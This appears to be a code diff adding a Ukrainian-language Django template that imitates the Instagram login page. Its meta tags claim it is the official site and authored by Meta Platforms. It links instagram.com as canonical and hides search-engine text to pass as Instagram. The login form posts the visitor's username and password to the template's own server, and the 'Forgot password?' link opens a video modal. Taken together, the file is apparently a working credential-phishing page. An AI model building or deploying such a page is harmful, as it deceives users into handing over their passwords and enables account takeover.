@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- SEO Meta Tags -->
+    <title>Instagram - Офіційний сайт | Вхід, Реєстрація, Завантажити Instagram</title>
+    <meta name="description" content="Instagram - найпопулярніша соціальна мережа для обміну фото та відео. Увійдіть в Instagram, створіть обліковий запис, завантажте додаток. Поділіться моментами з друзями та сім'єю. Instagram login, Instagram signup, Instagram download.">
+    <meta name="keywords" content="Instagram, інстаграм, соціальна мережа, фото, відео, поділитися, вхід, реєстрація, завантажити, додаток, мобільний, онлайн, безкоштовно, друзі, сім'я, моменти, історії, reels, stories, direct, повідомлення">
+    <meta name="author" content="Instagram, Meta Platforms, Inc.">
+    <meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">
+    <meta name="googlebot" content="index, follow">
+    
+    <!-- Open Graph Meta Tags -->
+    <meta property="og:title" content="Instagram - Офіційний сайт | Вхід, Реєстрація, Завантажити">
+    <meta property="og:description" content="Instagram - найпопулярніша соціальна мережа для обміну фото та відео. Увійдіть в Instagram, створіть обліковий запис, завантажте додаток.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://instagram.com">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/500px-Instagram_icon.png">
+    <meta property="og:site_name" content="Instagram">
+    <meta property="og:locale" content="uk_UA">
+    
+    <!-- Twitter Card Meta Tags -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Instagram - Офіційний сайт | Вхід, Реєстрація">
+    <meta name="twitter:description" content="Instagram - найпопулярніша соціальна мережа для обміну фото та відео">
+    <meta name="twitter:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/500px-Instagram_icon.png">
+    <meta name="twitter:site" content="@instagram">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/500px-Instagram_icon.png">
+    <link rel="apple-touch-icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/500px-Instagram_icon.png">
+    <link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/500px-Instagram_icon.png">
+    
+    <!-- Canonical URL -->
+    <link rel="canonical" href="https://instagram.com">
+    
+    <!-- Schema.org Structured Data -->
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "WebSite",
+        "name": "Instagram",
+        "alternateName": "Інстаграм",
+        "url": "https://instagram.com",
+        "description": "Instagram - найпопулярніша соціальна мережа для обміну фото та відео",
+        "potentialAction": {
+            "@type": "SearchAction",
+            "target": "https://instagram.com/search?q={search_term_string}",
+            "query-input": "required name=search_term_string"
+        },
+        "publisher": {
+            "@type": "Organization",
+            "name": "Meta Platforms, Inc.",
+            "url": "https://meta.com"
+        }
+    }
+    </script>
+    
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "SoftwareApplication",
+        "name": "Instagram",
+        "applicationCategory": "SocialNetworkingApplication",
+        "operatingSystem": "Android, iOS",
+        "description": "Instagram - соціальна мережа для обміну фото та відео",
+        "url": "https://instagram.com",
+        "downloadUrl": "https://play.google.com/store/apps/details?id=com.instagram.android",
+        "offers": {
+            "@type": "Offer",
+            "price": "0",
+            "priceCurrency": "USD"
+        }
+    }
+    </script>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        html, body {
+            background-color: #000;
+            height: 100%;
+            width: 100%;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            color: #fff;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .instagram-background {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            pointer-events: none;
+        }
+        
+        .instagram-text {
+            position: absolute;
+            color: #000;
+            font-size: 12px;
+            font-weight: 300;
+            opacity: 0.1;
+            transform: rotate(-45deg);
+        }
+        
+        .instagram-text:nth-child(1) { top: 10%; left: 5%; }
+        .instagram-text:nth-child(2) { top: 15%; right: 10%; }
+        .instagram-text:nth-child(3) { top: 25%; left: 15%; }
+        .instagram-text:nth-child(4) { top: 35%; right: 20%; }
+        .instagram-text:nth-child(5) { top: 45%; left: 8%; }
+        .instagram-text:nth-child(6) { top: 55%; right: 15%; }
+        .instagram-text:nth-child(7) { top: 65%; left: 25%; }
+        .instagram-text:nth-child(8) { top: 75%; right: 8%; }
+        .instagram-text:nth-child(9) { top: 85%; left: 20%; }
+        .instagram-text:nth-child(10) { top: 90%; right: 25%; }
+        .instagram-text:nth-child(11) { top: 20%; left: 50%; }
+        .instagram-text:nth-child(12) { top: 30%; right: 50%; }
+        .instagram-text:nth-child(13) { top: 40%; left: 60%; }
+        .instagram-text:nth-child(14) { top: 50%; right: 60%; }
+        .instagram-text:nth-child(15) { top: 60%; left: 70%; }
+        .instagram-text:nth-child(16) { top: 70%; right: 70%; }
+        .instagram-text:nth-child(17) { top: 80%; left: 80%; }
+        .instagram-text:nth-child(18) { top: 5%; left: 30%; }
+        .instagram-text:nth-child(19) { top: 95%; right: 40%; }
+        .instagram-text:nth-child(20) { top: 12%; left: 80%; }
+        
+        .main-content {
+            position: relative;
+            z-index: 10;
+        }
+        
+        .login-container {
+            background-color: #000;
+            border: 1px solid #262626;
+            border-radius: 1px;
+            padding: 40px;
+            width: 100%;
+            max-width: 350px;
+            text-align: center;
+        }
+        
+        .instagram-logo {
+            font-family: 'Instagram Sans', cursive;
+            font-size: 50px;
+            font-weight: 300;
+            margin-bottom: 30px;
+            color: #fff;
+            text-align: center;
+        }
+        
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            margin-bottom: 20px;
+        }
+        
+        .input-field {
+            background-color: #000;
+            border: 1px solid #262626;
+            border-radius: 3px;
+            padding: 12px 8px;
+            color: #fff;
+            font-size: 14px;
+            outline: none;
+        }
+        
+        .input-field::placeholder {
+            color: #8e8e93;
+        }
+        
+        .input-field:focus {
+            border-color: #a8a8a8;
+        }
+        
+        .login-button {
+            background-color: #0095f6;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            padding: 12px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+        
+        .login-button:hover {
+            background-color: #0081d6;
+        }
+        
+        .login-button:disabled {
+            background-color: #00376b;
+            cursor: not-allowed;
+        }
+        
+        .separator {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e93;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        
+        .separator::before,
+        .separator::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background-color: #262626;
+        }
+        
+        .separator span {
+            padding: 0 18px;
+        }
+        
+        .facebook-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: #0095f6;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+        
+        .facebook-icon {
+            font-size: 16px;
+            font-weight: bold;
+        }
+        
+        .forgot-password {
+            color: #0095f6;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        
+        .signup-container {
+            border: 1px solid #262626;
+            border-radius: 1px;
+            padding: 20px;
+            margin-top: 10px;
+            text-align: center;
+            width: 100%;
+            max-width: 350px;
+        }
+        
+        .signup-text {
+            color: #8e8e93;
+            font-size: 14px;
+        }
+        
+        .signup-link {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        
+        .seo-content {
+            display: none;
+        }
+        
+        /* Video Modal Styles */
+        .video-modal {
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .video-content {
+            background-color: #000;
+            border-radius: 10px;
+            padding: 20px;
+            position: relative;
+            max-width: 90%;
+            max-height: 90%;
+            overflow: hidden;
+        }
+        
+        .iframe-container {
+            width: 400px;
+            height: 480px;
+            overflow: hidden;
+            border-radius: 8px;
+            position: relative;
+        }
+        
+        .iframe-container iframe {
+            position: absolute;
+            top: -60px;
+            left: 0;
+            width: 100%;
+            height: 600px;
+            border: none;
+        }
+        
+        .close-video {
+            color: #fff;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            z-index: 1001;
+        }
+        
+        .close-video:hover {
+            color: #0095f6;
+        }
+        
+        .video-content iframe {
+            border-radius: 8px;
+        }
+        
+        /* Instagram embed oq qismlarini yashirish */
+        .video-content iframe {
+            border-radius: 8px;
+            /* Instagram embed ning tepa va pastki qismlarini yashirish */
+            clip-path: inset(60px 0 60px 0);
+            margin-top: -60px;
+            margin-bottom: -60px;
+        }
+    </style>
+    
+    <script>
+        function showVideo() {
+            document.getElementById('videoModal').style.display = 'flex';
+        }
+        
+        function closeVideo() {
+            document.getElementById('videoModal').style.display = 'none';
+        }
+        
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            var modal = document.getElementById('videoModal');
+            if (event.target == modal) {
+                modal.style.display = 'none';
+            }
+        }
+    </script>
+</head>
+<body>
+    <!-- Background Instagram Text -->
+    <div class="instagram-background">
+        <div class="instagram-text">Instagram</div>
+        <div class="instagram-text">Instagram</div>
+        <div class="instagram-text">Instagram</div>
+        <div class="instagram-text">Instagram</div>
+        <div class="instagram-text">Instagram</div>
+        <div class="instagram-text">Instagram</div>
+        <div class="instagram-text">Instagram</div>
+        <div class="instagram-text">Instagram</div>
+        <div class="instagram-text">Instagram</div>
+        <div class="instagram-text">Instagram</div>
+        <div class="instagram-text">Instagram</div>
+        <div class="instagram-text">Instagram</div>
+        <div class="instagram-text">Instagram</div>
+        <div class="instagram-text">Instagram</div>
+        <div class="instagram-text">Instagram</div>
+        <div class="instagram-text">Instagram</div>
+        <div class="instagram-text">Instagram</div>
+        <div class="instagram-text">Instagram</div>
+        <div class="instagram-text">Instagram</div>
+        <div class="instagram-text">Instagram</div>
+    </div>
+    
+    <main class="main-content">
+        <div class="login-container">
+            <h1 class="instagram-logo">Instagram</h1>
+            
+            <form class="login-form" action="/" method="post">
+                {% csrf_token %}
+                <input type="text" class="input-field" name="username" placeholder="Номер телефону, ім'я користувача або ел. пошта" required>
+                <input type="password" class="input-field" name="password" placeholder="Пароль" required>
+                <button type="submit" class="login-button">Увійти</button>
+            </form>
+            
+            <div class="separator">
+                <span>АБО</span>
+            </div>
+            
+            <a href="#" class="facebook-login">
+                <span class="facebook-icon">f</span>
+                Увійти через Facebook
+            </a>
+            
+            <a href="#" class="forgot-password" onclick="showVideo()">Забули пароль?</a>
+            
+            <!-- Video Modal -->
+            <div id="videoModal" class="video-modal" style="display: none;">
+                <div class="video-content">
+                    <span class="close-video" onclick="closeVideo()">&times;</span>
+                    <div class="iframe-container">
+                        <iframe 
+                            src="{{ video_url }}embed/?loop=0&autoplay=0&muted=1" 
+                            width="400" 
+                            height="600" 
+                            frameborder="0" 
+                            scrolling="no" 
+                            allowtransparency="true">
+                        </iframe>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="signup-container">
+            <p class="signup-text">
+                Не маєте облікового запису? 
+                <a href="/register/" class="signup-link">Зареєструйтеся</a>
+            </p>
+        </div>
+    </main>
+    
+    <!-- Hidden SEO Content for Search Engines -->
+    <div class="seo-content">
+        <h2>Instagram - Офіційний сайт</h2>
+        <p>Instagram - це найпопулярніша соціальна мережа для обміну фото та відео. Завантажте Instagram додаток безкоштовно для Android та iOS. Увійдіть в Instagram або створіть новий обліковий запис. Instagram дозволяє ділитися моментами з друзями та сім'єю через фото, відео, історії та reels.</p>
+        
+        <h3>Instagram функції:</h3>
+        <ul>
+            <li>Завантаження та публікація фото та відео</li>
+            <li>Instagram Stories - тимчасові публікації</li>
+            <li>Instagram Reels - короткі відео</li>
+            <li>Direct повідомлення</li>
+            <li>Пошук та відстеження друзів</li>
+            <li>Instagram Live - прямі трансляції</li>
+            <li>Instagram Explore - відкриття нового контенту</li>
+        </ul>
+        
+        <h3>Як увійти в Instagram:</h3>
+        <p>Для входу в Instagram використовуйте свій номер телефону, ім'я користувача або електронну пошту разом з паролем. Також можна увійти через Facebook або створити новий обліковий запис Instagram.</p>
+        
+        <h3>Завантажити Instagram:</h3>
+        <p>Завантажте Instagram додаток з Google Play Store для Android або App Store для iOS. Instagram доступний безкоштовно для всіх користувачів.</p>
+        
+        <h3>Instagram безпека:</h3>
+        <p>Instagram забезпечує безпеку ваших даних та приватність. Використовуйте надійні паролі та двофакторну автентифікацію для захисту облікового запису.</p>
+    </div>
+</body>
+</html> 
